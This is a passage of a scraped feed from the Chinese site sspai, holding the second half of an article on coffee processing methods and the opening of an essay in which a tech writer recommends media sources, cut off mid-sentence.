src=\"https://cdn.sspai.com/2022/01/27/article/47b45a34fe19f2c96594ef4cfe5a7545\"><figcaption>哥伦比亚手工采收</figcaption></figure><ul><li>机械采收：用自动化收割机械进行采收，这种方式成本低，速度快。因为机器没有筛选机制，一切照单全收，导致采摘品质参差不齐。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/9751700aaeb173140b60a43430a3ea79\"><figcaption>巴西机械采收</figcaption></figure><p>采摘后，我们就得到了咖啡果实，下图是一张咖啡结构图，我们喝到的咖啡其实是最后一层种子，也就是咖啡豆。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/b4707fb22637aa1ac9778ba3defa2838\"></figure><p>而为了得到最后一层采取的处理措施，被称为「处理法」。</p>\n<p>目前三种最原始的处理法是：日晒法、水洗法、蜜处理法。这三种处理法都是通过自然界中的条件来进行处理，是最早的咖啡处理手法。</p>\n<p>即便现在出现了各式各样的新兴处理法，但这些处理法，还是在传统处理法的基础上发展而来，那我们就来看看，这三种基础的处理法，到底给咖啡生豆带来了什么？</p>\n<h2>传统处理法</h2>\n<h3>日晒法（<strong>Natural</strong>）</h3>\n<p>日晒法是最古老，最原始的一种处理方法。顾名思义，就是将咖啡果实直接放在太阳底下暴晒 2–4 周。一般多在干燥、日照充足的国家使用。如果某些湿度比较大，光照条件不好的国家使用此方法，多半会借助干燥机帮助完成干燥的过程。</p>\n<h4>处理步骤</h4>\n<p><strong>分拣，</strong>分拣有两种方法：</p>\n<ul><li>手工：将采摘后的咖啡果实铺在架子上，人工将未成熟、坏果、树枝、树叶等杂物进行手工摘除。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/60e80c08682ac985d6510c1d027eaff4\"></figure><ul><li>沉池：将咖啡果实放在蓄水池中，成熟饱满的咖啡果实会沉在水底，未成熟的果实、树枝、树叶会浮在水面，直接将这些杂物清除即可完成初步分拣。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/594067282279cbfa6b127b43085d9920\"></figure><p><strong>晾晒，</strong>将分拣完的咖啡果实直接放在太阳下晾晒。这里也分为两种方法：</p>\n<ul>\n<li>地面晾晒：最简单的将咖啡果实直接铺在平地上，这是最早的晾晒方式。好处是简单、方便；缺点是直接与地面接触，会有一些豆子因为发酵过度或者晾晒不彻底而发霉、变质。有的还会沾上小动物的粪便等等。</li>\n<li>架晒：放在有纱网的架子上进行晾晒。好处是可以避免大量灰尘、动物粪便、尿液污染，纱网提供了全方位的通风条件，避免了发霉、变质的可能。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/a61c45e7d14363c04a3b792740d1549b\"></figure><p>将咖啡果实均匀的铺在曝晒场之中，且每日需翻动数次。这个过程通常持续 2~4 周左右，依当地气候而定，在咖啡豆内部的含水量降至 10~12% 时，即完成日晒的步骤。</p>\n<p><strong>脱壳：</strong>经过 2~4 周的晾晒，使得果皮变干、变硬，这时就可以使用脱壳机脱去外壳，取得咖啡豆。</p>\n<p><strong>分级：</strong>咖啡豆收走后，将会进行产地内的一次生豆分级，也就是上篇内容中提到过的分级标准。然后就可以装袋等待销售了。</p>\n<h4>风味</h4>\n<p>日晒豆颜色偏黄，豆体易出现缺角（打壳机造成的）。在干燥过程中会吸收咖啡果肉中的果糖精华，因此果香浓郁，甜度也高，醇厚度也略高于水洗或蜜处理；干净度和明亮度逊于半水洗和水洗。</p>\n<h3>水洗法（Washed）</h3>\n<p>在 18 世纪，由荷兰人发明了水洗法。这种方法特别适合常见下雨、湿度又高，无法进行日晒的国家。目前这项技术被广泛应用，与日晒法最大的不同就是利用发酵来去除果胶层。</p>\n<h3>处理步骤</h3>\n<p><strong>分拣：</strong>此处分拣，直接使用沉池的方法用水进行筛选</p>\n<p><strong>脱果皮与果肉：</strong>筛选好的咖啡果实，放入果肉筛除机中，将果皮与果肉脱离，留下咖啡豆。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/465c8513fc94de79baa2c50722d8422c\"></figure><p><strong>发酵：</strong>这个步骤的目的是要利用生物处理的方法，将果胶去除。将经过果肉筛除机处理的咖啡果实，放入发酵槽 16~36 小时，发酵菌会溶解掉果胶。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/3a26a67a7609473581bf5a1d1c6a8c4b\"></figure><p><strong>水洗：</strong>在完成发酵、去除果胶后，由于发酵菌与杂质会残留在咖啡豆上，因此会再清洗一次咖啡豆。为了要清洗干净，这一步骤会消耗大量的清水。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/9b764242a539ef7db61596884e7ce3a2\"></figure><p><strong>干燥去除羊皮层、银皮：</strong>通常会利用机器（或晒干）将咖啡果实烘干，让水分含量降到 10~14%。接着利用脱壳机去除剩余的内果皮与银皮，即完成加工处理。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/80931cd45c00c01e515a6649b03be704\"></figure><p>利用水洗法处理的咖啡豆干净杂质少，因为果实中的果肉很早被洗掉，所以不用担心发霉问题，豆子整体更干净，品质比较稳定。</p>\n<p>但水洗法非常废水，成本比日晒高一些，因此只有水资源非常丰富的地方才会用此法。</p>\n<h4>风味</h4>\n<p>水洗豆酸质更佳明亮，清爽，口感干净，醇厚度略低于日晒。</p>\n<h3>蜜处理（Honey）</h3>\n<p>蜜处理这种处理法，目前在中美洲极为流行，其中哥斯达黎加比例更高一些。由于咖啡豆表层粘膜极为粘滑且糖度极高，因此人们通常称之为「蜜」。在蜜处理过程中，咖啡在干燥时会留有部分或全部的「蜜」。咖啡果实经采摘、分级和去果肉果皮，便会被放在干燥床上进行干燥。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/68582e89dff680f5721b714c18bf3a41\"></figure><p><strong>分拣：</strong>方法同日晒法所用的沉池法筛选成熟的咖啡果实。</p>\n<p><strong>去除果皮与果肉（同水洗法）：</strong>透过果肉筛除机（pulping machine），将咖啡果实的外果皮与果肉去除（会留下果胶、内果皮与银皮）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/56218175a7137c4b03c78225edf624c0\"></figure><p><strong>日晒：</strong>将带有果胶的咖啡豆，铺在曝晒场直接进行曝晒，使含水量降到 10~14%。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/d752e9757b7c15b2196916142a2e23df\"></figure><p>由于粘膜的干燥时间很短，因此在干燥过程中咖啡豆几乎不会发生发酵。用这种处理方法加工的咖啡豆酸度要比自然水洗法略高一些，但比水洗法和自然日晒法加工要低很多。</p>\n<p>而蜜处理与其他两种处理法最大的不同在于蜜处理会根据发酵程度，再细分为以下几种：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/b3483771f4d2b05b6f3ee5d776143ad3\"></figure><ul>\n<li>\n<strong>白蜜：</strong>去除 80% 果胶，比较接近水洗的感觉。目前不太多见，了解一下即可。</li>\n<li>\n<strong>黄蜜：</strong>去除 40% 左右的果胶，直接用光照来干燥，持续8天左右使水分含量达到稳定值。</li>\n<li>\n<strong>红蜜：</strong>去除 25% 左右的果胶，因为保留的果胶更多，所以需要更多的时间来脱水，同时减少阳光直接曝晒的时间，有的地方也会用到遮光布，大约会用到12天左右。</li>\n<li>\n<strong>黑蜜：</strong>几乎没有去除果胶，果胶更厚，大约会用到 20-25 天的时间来干燥脱水。</li>\n</ul>\n<h4>风味</h4>\n<ul>\n<li>黄蜜：相对温和的果香，最接近水洗咖啡的感觉</li>\n<li>红蜜：有较明显的果香与甜感，以及类似糖浆口感的醇厚度。</li>\n<li>黑蜜：发酵度很高，带有酒香，绵密的口感，接近日晒的口感。</li>\n</ul>\n<h3>湿刨法（Wet-Hulling）</h3>\n<p>湿刨法其实更带有产地特色，不是一种普世的处理方法。但它处理方式相对传统，因此我将它归纳为传统处理法。</p>\n<p>印度尼西亚苏门答腊和曼特宁咖啡的产生是不可分割的。苏门答腊岛的气候潮湿，而传统三大处理方法对于日照条件要求都十分之高。于是，当地的咖啡制造者因地制宜，发明了这种独特的制作方法。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/3b2b9d93c9dac772b3424b85b0e44803\"></figure><p>湿刨法与水洗方式的杯测风味截然不同。因为羊皮纸壳和生豆之间存在着相当大的空间差距，所以咖农在生豆第一次干燥达到 30–35% 的含水量时，就卖给当地收购湿羊皮外壳生豆的回收站。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/592c416807b5a965f12c14987d45ef8b\"></figure><p>然后再过几天，将含水率降至 12–13%，即可收获储存。</p>\n<p>通过湿刨法处理的曼特宁，低酸、低甜、高醇厚度，口感十分浓郁。焦糖与果香味明显，甚至带有药草或青草香气以及木质的气味。</p>\n<h2>新兴处理法</h2>\n<h3>厌氧发酵处理（Anaerobic Fermentation）</h3>\n<p>厌氧处理法，可谓在新兴处理法中发展势头最盛。现在各种花哨的厌氧处理方式。其最早是在 2015 年的 WBC（世界咖啡师大赛）比赛中，由澳大利亚选手 Sasa Sestic 带来的一款哥伦比亚云层庄园的咖啡豆，一举夺冠。而到了 2018 年，比赛前 6 名有 5 名使用了厌氧发酵处理的豆子，可见厌氧处理的独特魅力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/9915aebb157d9729b57f241c262669c9\"><figcaption>图源：2015 年 WBC 决赛 Sasa Sestic 比赛视频</figcaption></figure><p>厌氧发酵处理法，其实源自于红酒的制程之一。这种处理法的特点：</p>\n<ul>\n<li>必须要有个可监控的完全封闭的不透明容器；</li>\n<li>再对容器进行密封，发酵其实是一种将糖转化成多种化合物产生酒精和二氧化碳的过程，进而使密封的容器中产生高压，而高压有利于种子吸收果胶中的风味物质；</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/182e5c474c14d3e3fd92e2cbe217e57b\"></figure><ul>\n<li>将容器放置在室内，并且对室内的温度要严格控制，控制温度和时间可以控制容器的发酵程度。</li>\n<li>最后是向容器持续注入二氧化碳，将氧气排出，在发酵过程中，PH 值是发酵过程中一个重要的参考指针，要严格控制温度与 PH 值的变化，当果胶与粘液中的糖分刚被完全消耗掉时，立即开封中止发酵，并马上在日光下进行干燥，避免过度发酵。</li>\n</ul>\n<p>厌氧发酵的核心是发酵过程、程度可控，可根据需求进行精确控制，而自然处理法发酵过程不可控在此技术的基础上，又诞生出了一些变化处理方式：</p>\n<p><strong>双重厌氧发酵：</strong>顾名思义，就是将发酵过程分成了 2 个阶段，每个阶段进行不同时长的发酵，突出不同的风味。</p>\n<p><strong>厌氧日晒：</strong>厌氧发酵过后，再拿出来晒。它的特点就是结合厌氧方式发酵的可控，与自然日晒发酵的不可控带来的口感变化。</p>\n<h3>二氧化碳浸渍（Carbonic maceration）</h3>\n<p>二氧化碳处理法（又称咖啡红酒处理法）灵感来源于红酒的酿造工艺。早在 1872 年，著名微生物学之父路易·巴斯德（Louis Pasteur）就发现，葡萄果实在空气中和在纯二氧化碳环境中的味道是不同的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/093f64257da9748bdded0504dda61116\"><figcaption>图源：百度百科二氧化碳浸渍</figcaption></figure><p>酿酒师在采用二氧化碳浸渍法时，会将整串带梗的且未破皮的完整葡萄小心放在充满二氧化碳气体的密闭容器中。在正常情况下，葡萄细胞会消耗葡萄糖和氧气，进而释放二氧化碳、水和能量。但在充满二氧化碳的无氧环境中，葡萄细胞为了获得细胞所需要的能量，会迫使完整葡萄进行细胞内发酵，这样就会将葡萄糖直接转化为酒精、二氧化碳、能量以及许多芳香物质，而根据温度的不同，浸渍过程可能持续 1–3 周。当然，葡萄在无氧环境中进行厌氧代谢、发酵之后会自然破裂，当到达这一阶段时就可以进行传统发酵了。</p>\n<p><strong>目前可以把红酒处理法的种类分为：</strong></p>\n<ul>\n<li>醋酸发酵（Aerobic 有氧发酵）</li>\n<li>乳酸发酵（Anaerobuic 厌氧发酵）</li>\n<li>混合发酵（Mix Fermentation=Aerobic+Anaerobuic）</li>\n</ul>\n<p>而将此工艺在咖啡中使用，其实差不多，具体处理步骤大体如下：</p>\n<ul>\n<li>将咖啡豆去除果肉果皮后放入不锈钢容器里。不锈钢容器能更加保证干净的风味。接着控制不同的温度，影响反应的快慢。</li>\n<li>把不锈钢容器放到更容易控制温度的室内，他们发现如果需要豆子更复杂的酸，则就把温度控制在 4–8°C，而如果需要豆子有更高的甜度，则把温度就控制到 18–20°C。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/e913f2722f920dbca71be9ee0faf1266\"></figure><ul>\n<li>把发酵桶密封起来，这样能发展出更多的芳香物。</li>\n<li>这是最关键和重要的一步。往发酵桶中加入二氧化碳，二氧化碳的密度比氧气大，从而挤压出空气。这样做让咖啡豆置于无氧环境，因为没有氧气，这就让咖啡豆果胶中的糖分分解速度减慢，同时 PH 值也会以比较慢的速度下降。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/1e6be27bad2404abc899d593f1b9321a\"><figcaption>图源：sumiaproncoffee</figcaption></figure><p>在二氧化碳的帮助下，整个发酵过程在 22°C 下将延长 3 天，而如果温度更低的话，发酵的时间则可以更长。减少了干涩的口感和醋酸的味道。</p>\n<p>随着厌氧工艺可控的特性被发掘，现在很多咖农都喜欢在这一步加入一些「添加剂」。例如不同品种的果胶粘液或特定的酵母菌，以引入咖啡豆往不同风味中发展。这也是江湖中「香精豆」的一种来源。</p>\n<h3>酒桶发酵（Barrel Fermentation）</h3>\n<p>酒桶发酵也可以算是近几年比较火的一种处理法了。一般采用朗姆酒桶、威士忌酒桶、雪莉酒桶。主要是洪都拉斯在用这类处理法。而且也确实惊艳了不少人。</p>\n<p><strong>「雪莉桶」</strong>是威士忌行业中的雪莉酒厂用来做陈年的桶，雪利酒是一种著名的加强酒，产自西班牙南部阳光明媚的赫雷斯产区，雪利酒的酿造的过程中一定要经过索雷拉系统（Solera System）熟化这道工序。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/9b4deeaef68b843d5524e5f92256d269\"></figure><p>索雷拉系统本质上是指雪利酒加强之后，将不同年份的雪利酒混合陈酿的过程；在索雷拉系统中，所有的酒桶会根据年份层层迭放，最底层是年份最老的雪利酒，最上面则是最为年轻的雪利酒，每年会从最底部的酒桶中抽取部分酒液用于装瓶和销售，再从上一层的酒桶中抽取相应比例的酒液进行补充。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/6cd630effe444b138174f0231d99a370\"></figure><p>而精致水洗雪莉桶发酵法就是将采摘回来的咖啡樱桃先是进行精致水洗处理，水洗处理完之后把这些处理好的咖啡樱桃放进熟成过威士忌的雪莉酒桶中在 15–20℃ 左右的低温环境中发酵 30–40 天，然后再进行阴干晾晒；雪莉桶发酵处理法使得咖啡有惊艳的香气，浓稠的口感。</p>\n<h2>总结</h2>\n<p>咖啡处理法是大自然赋予咖啡的神奇变化，虽然现在各类特殊处理法大行其道，各种「添加」带来不少争议，但这些变化确实给消费者带来了更好入口，更好描述的一杯饮品，也侧面帮助我们更好的抓住了消费者的舌头。</p>\n<p>希望这篇内容让大家了解了咖啡处理法背后的一些故事，明白了处理法对咖啡带来的影响。处理法说完，咖啡豆就离开了初加工的环节，下一篇我们就来看看咖啡烘焙带给咖啡哪些不一样的变化吧。</p>\n<h4><strong>参考资料</strong></h4>\n<ul>\n<li><a href=\"https://www.youtube.com/watch?v=0JxPy7ioUe4\" target=\"_blank\">Coffee Processing Explained: What is a Natural Process Coffee? | Hasbean</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=WaVrA926wNE&amp;t=47s\" target=\"_blank\">Coffee Processing Explained: What is Washed Coffee? | Hasbean</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=k5iw31z1FAY&amp;t=10s\" target=\"_blank\">Honey Coffee Processing</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=_Uitk1pqvls\" target=\"_blank\">湿刨法 Coffee Processing - Wet-HulledCoffee</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=7jttyvyUGpI\" target=\"_blank\">Sasa Sestic - Final presentation WBC15</a></li>\n<li>巴西采收：<a href=\"https://www.youtube.com/watch?v=VtM9Doxw878&amp;t=66s\" target=\"_blank\">The Genuine Origin Coffee Project | Brazil</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71184"},{"title":"年度征文 | 写作，是一种生活方式","date":"2022-02-15 03:30:35","description":"\n<p><strong>编注：</strong></p>\n<p>本文是少数派 <a href=\"https://sspai.com/post/70693\" target=\"_blank\">2021 年度征文 </a>活动 <code>#生活 21</code> 标签下的入围文章。本文仅代表作者本人观点，少数派对标题和排版略作调整。</p>\n<p>和往年不同，今年文章的数据表现将很大程度上决定征文活动的最终走向，包括「双倍稿酬（由飞书赞助）」活动奖励、最终票选名单以及征文奖品类型。如果你喜欢这篇文章，不妨通过充电或评论的方式支持作者。</p>\n<hr>\n<p>好像，「XX 是一种生活方式」这样的句型要被用烂了。但是我实在想不到一个更好的方法去总结我接下来要写出来的这篇文章。毕竟，在少数派的写作本身，就是我生活的一部分，而我的生活方式中的确有不少成分是围绕写作这个目的去展开的。尽管我不是职业作家（天哪，我觉得如果我有那个自律的能力的话，我很想成为一名自由撰稿人），但是写作已经超越了爱好的范畴 —— 所以我只好把它定义为生活方式。</p>\n<p>去年年底，我恰好迷上了美剧《Sex and the City》。这部美剧以 Carrie Bradshaw，纽约一家报纸的专栏作家，书写她自己和朋友们的罗曼史，作为展开的方式。当然了，这部美剧以其开放大胆的镜头著称，但是我却总是为主角 Carrie 写作的方式（时间、地点）而着迷：有的时候她是在窗边，看着对面的一对情侣做着不可描述的事情；有的时候是坐在床上，点着一根烟，开始冥想；有的时候是因为受不了公寓的拥挤不堪，出门去咖啡馆看着来来往往的人群 —— 或许正是这份写作时无拘无束的自由，让我最为渴望吧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n0db34taatkrl000.png\"><figcaption>Carrie 和她的 PowerBook G3</figcaption></figure><h2>阅读是写作的开始</h2>\n<p>获取信息可能是输出信息的第一步 —— 我反正是这么觉得。自由的写作本身就来自大量的泛读，怪不得人们常说「<s>天下文章一大抄</s>」。套路都摆在那里，写作的时候留心借鉴，的确是事半功倍的。</p>\n<p>我的阅读来源其实还算不上太「广泛」，只有一些会经常关注的媒体 / up / YouTuber，作为信息来源我个人认为已经足够，同时也不会每天感到信息过载。由于个人感兴趣的点主要集中在科技 / 数码方面，关注的媒体网站也大多数在此列。</p>\n<p>不过，在列举之前，我要先免责声明一下：</p>\n<ul>\n<li>以下列举的 YouTuber / UP 主 / 网站 / 媒体，除了少数派之外，与我本人<strong>没有任何利益往来</strong>。与少数派的利益往来，仅限于我作为少数派作者的稿酬，不构成任何商业意义上的广告。</li>\n<li>以下列举的 YouTuber / UP 主 / 网站 / 媒体，尽管是我的信息源，但这不表明我认同这些 YouTuber / UP 主 / 网站 / 媒体上曾经发布的、正在发布的，或者是将来要发布的<strong>所有观点</strong>。</li>\n<li>以下列举的 YouTuber / UP 主 / 网站 / 媒体<strong>并非我信息来源的全部</strong>。</li>\n</ul>\n<h3>YouTuber / B 站 up</h3>\n<p>现在是一个视频的时代，对吧？所以免不了的，我也关注了一些 YouTuber 和 B 站 up，主要也是有关科技的。关注视频类的账号，其实主要是因为有些时候看文字测评<s>很容易睡着</s>，视频其实从形式上有趣、直接得多，同时获得的信息量并不算少。每次 Apple 产品的测评解禁，我总是蹲守几家媒体第一时间的上手评测。</p>\n<p>但同时，视频能给到的信息终归有限 —— 无论是时长，还是视频本身具有的更强的直观性，都是它提供更多信息的阻碍。因此，我也会在视频后参考媒体报道，去关注一些很多视频评测尚未提到的细节。</p>\n<h4>极客湾</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n0tb34taavnbb3e0.png\"><figcaption>极客湾对于 M1 的解析</figcaption></figure><p>看极客湾的视频，其实是从 iPhone 12 开始的。他们做的 A14 分析视频，确实让我见识到了「极客」二字不是说说而已。硬核的硬件解说视频一直是极客湾的主打，无论是高通骁龙、麒麟还是天玑系列，极客湾一直使用专业而且易懂的方式讲解不同移动 CPU 之间的比较与代际关系（要是没记错的话，把原神作为 benchmark 也是从他们这里卷起来的一阵风吧？）</p>\n<ul>\n<li><a href=\"https://www.bilibili.com/video/BV1ih411n7BR?spm_id_from=333.999.0.0\" target=\"_blank\">苹果A15性能分析：它几乎征服了原神！_哔哩哔哩_bilibili</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV1MY411W74g?spm_id_from=333.999.0.0\" target=\"_blank\">骁龙8 Gen1性能分析：功耗爆炸高！但GPU很强..._哔哩哔哩_bilibili</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV1ZZ4y1K7zg?spm_id_from=333.999.0.0\" target=\"_blank\">我们仍未知道你的下一台电脑的名字。_哔哩哔哩_bilibili</a></li>\n</ul>\n<h4>LinusTechTips</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n15b34taatkrl00g.png\"><figcaption>Linus Tech Tips 的传统艺能 —— 光速吟唱</figcaption></figure><p>老莱「知名果黑」的名声坐实之后，我就开始关注这家视频了。现在，LinusTechTips 旗下在 YouTube 早已不止一个号，可以说是已经演变成为科技评测界的「巨头」之一了。LinusTechTips 的更新频率无疑是我关注的科技类 up 主 / YouTuber 中最为频繁的（几近日更），同时内容也是最为丰富的 —— 从装机到最新的硬件评测再到科技生活中常见的小问题，LinusTechTips 都有涉及，风格也是风趣幽默，并非科技测评类账号常见的严肃中立风格。并且，其中并不乏一些十分硬核的分析（例如针对电脑关机相关问题的 <a href=\"https://www.bilibili.com/video/BV11Y411b7Gt?spm_id_from=333.999.0.0\" target=\"_blank\">troubleshooting</a>）。 最后，LinusTechTips 也在 B 站开设了官方账号，并且聘请国内字幕组进行双语字幕翻译，可以说是十分良心了。</p>\n<ul>\n<li><a href=\"https://www.bilibili.com/video/BV1Ra4111795?spm_id_from=333.999.0.0\" target=\"_blank\">【官方双语】诺顿带我来挖矿，能出什么问题呢？#linus谈科技_哔哩哔哩_bilibili</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV1RY411W7aE?spm_id_from=333.999.0.0\" target=\"_blank\">【官方双语】终于简单点了... Linus &amp; Luke日用Linux挑战第三集#linus谈科技_哔哩哔哩_bilibili</a></li>\n</ul>\n<h4>先看评测</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n1db34ta9bscq1sg.png\"><figcaption>先看评测的显示器横屏与购买建议</figcaption></figure><p>先看评测的一系列横评比较类视频是给我留下最为深刻的印象的：从真无线耳机到显示器再到吸尘器、洗衣机，先看评测并非专注于 3C 数码，而是将生活电器也纳入了评测对比的行列，可以说是更加贴近生活的，但同时在专业性上不打折扣。《<a href=\"https://www.bilibili.com/video/BV15o4y1d7yV?spm_id_from=333.999.0.0\" target=\"_blank\">55 寸 4K 电视只要 1200，拼多多爆款电视能买吗？</a>》是我认为他们目前做得最好的一条 —— 它不仅从产品参数以及实测性能的角度告诉我们如何进行选择，更是帮我们（消费者）做了 out-of-the-box thinking：厂商为了减少成本，到底可以做到什么程度？</p>\n<h3>各类科技媒体</h3>\n<h4><a href=\"https://sspai.com/\">少数派</a></h4>\n<p>既然「偷师」，那么自家人的网站怎么能少！少数派上的文章尽管我并不是每篇都很感兴趣，我也没有充值会员，但是仅仅是首页的内容，其实就足够我在写作时参考和学习。</p>\n<p>有些相关主题的写作，我可能会去少数派翻一翻前人的作品，从中汲取一些灵感。比如今年写《<a href=\"https://sspai.com/post/67303\" target=\"_blank\">2021 年最适合你的翻译 App 是什么？你可能需要这份指南</a>》的时候，我就<s>无情</s>参考了 Harvey 在 2020 年写的 <a href=\"https://sspai.com/post/60086\" target=\"_blank\">相关对比</a>，从这篇文章中学习了翻译工具比较的框架，最终在自己的文章中加入了个人更加关注的特性点。</p>\n<p>此外，写《<a href=\"https://sspai.com/post/68415\" target=\"_blank\">城市漫游指南 | 魂断莫斯科</a>》时，我也参考了此前少数派其他《城市漫游指南》系列的文章，看看大家对于一个陌生的城市，最为关注的是哪些要点 —— 再结合自己对于莫斯科的情感和体验，去描摹个人在莫斯科的生活。</p>\n<p>也正因为如此，我真的非常感谢少数派这个平台，可以参考的资源那么多的同时，也保证了内容的质量和更新的频率。</p>\n<h4><a href=\"http://wired.com/\" target=\"_blank\">WIRED 连线</a></h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n1lb34taatkrl010.png\"></figure><p>《WIRED 连线》是一本科技数字生活类的国际杂志。这本杂志本身能够提供的信息倒不算特别多，但是每次它的主题文章都能够有那么一两篇特别吸引我的眼球。比如我这两天看到的有关俄罗斯勒索软件团队的文章，了解了不少 2020 年以来勒索软件的发展历程，以及这些团队中的风云变幻。</p>\n<ul><li><a href=\"https://www.wired.com/story/trickbot-malware-group-internal-messages/\" target=\"_blank\">Inside Trickbot, Russia’s Notorious Ransomware Gang</a></li></ul>\n<p>此外，WIRED 也有不少生活类内容值得关注。我从这里每周收取的 newsletter 分为正刊系列和 Gadget Lab 系列，后者就主要介绍了一些数字生活中可能需要的许多东西。比如最近的一期就是有关如何自助维修 iPhone 的系列文章，包括可能需要的准备、工具，以及一旦翻车如何自救的 tips，十分受用。</p>\n<p>此外，WIRED 由于是传统纸媒，所以它的遣词造句以及行文结构通常十分专业。在几乎每一篇故事性的新闻报道中，我们都既可以看到事件清晰的来龙去脉，也不会觉得过于无聊。相比接下来介绍的其他更为「硬核」的电子消费科技媒体，WIRED 探讨的更多是科技与人类社会生活之间的交互。</p>\n<h4><a href=\"http://theverge.com/\" target=\"_blank\">The Verge</a></h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n25b34ta9bscq1t0.png\"></figure><p>每年 Apple 新品发布，我都会特别注意 The Verge 第一时间的上手评测。我还记得去年 Apple 新品发布季的时候，The Verge 的工作人员仿佛没有睡觉一般，不停地在 YouTube 上发视频、在网站上发文。The Verge 这些测评给人的感觉，就是单刀直入、不加掩饰。每一篇评测，它都能抓住我最想了解的点去深挖。</p>\n<p>比如，最近的评测是讲 Intel 12 代 CPU 的。相比其他媒体对于它性能改进的「大加赞赏」，以及对其相比 11 代 Intel 处理器的改进，The Verge 另辟蹊径，犀利地指出了 form factor 这一重要因素。目前送测媒体的 12 代 CPU 是封装在 MSI GE76 Raider 17 英寸游戏本中。先不提这 3999 美元的价格，只是这个大小、重量和续航，就已经让它几乎配不上「laptop」这个定位了（The Verge 原话是：这是最接近桌面计算设备的笔记本了）。尽管 Core i9 12900HK 能够在许多方面战胜 M1 Max，但是目前来看，我们还不知道新一代架构在轻薄本 —— 也就是大众最能够体验到的笔记本产品 —— 中的具体表现。</p>\n<ul><li><a href=\"https://www.theverge.com/2022/1/31/22906891/intel-12th-gen-alder-lake-mobile-laptop-chips-msi-ge76-raider-video\" target=\"_blank\">Intel takes a bite out of Apple</a></li></ul>\n<p>此外，The Verge 的文字评测也值得一读，可以学到不少有关评测结构的知识。一篇硬件评测的基本方面、如何排序、如何组织语言，都可以从中略知一二。The Verge 还会在评测中给出评分和最终的结论，方便购买选择时参考的同时，也为我写文章提供了一些新的想法和角度。例如，我在写 Surface Laptop Go 的测评时，就参考了 The Verge 的这篇测评，这也让我对自己手里这台笔记本有了更多的了解。</p>\n<ul><li><a href=\"https://www.theverge.com/21512680/microsoft-surface-laptop-go-review-price-specs-features\" target=\"_blank\">Surface Laptop Go review: a case study in cost cutting</a></li></ul>\n<h4><a href=\"http://notebookcheck.net/\" target=\"_blank\">Notebook Check</a></h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n2db34ta988752f0.png\"></figure><p>如果说 WIRED 和 The Verge 还都比较偏数字生活（从这个意义上说，更「少数派」），那么 Notebook Check 则是实打实的「用数据说话」。一般来说，如果我在写作的过程中需要了解一款产品（尤其是笔记本）内部使用的是哪些型号的零部件，以及它们的具体性能，甚至它们在同类硬件中的相对位置，那么 Notebook Check 是我最信赖的消息来源。这家网站不仅仅有针对整台笔记本、电脑或者平板的精细评测，也可以从具体的 CPU 和 GPU 型号来对不同厂家的电脑硬件进行比较。如果是对数字比较敏感，或者是感觉「没看到具体数字就不够客观」，这家网站的确能够提供十分全面精准的硬件性能信息，并且通过大量对比的方式呈现数据（比如 CPU 和 GPU 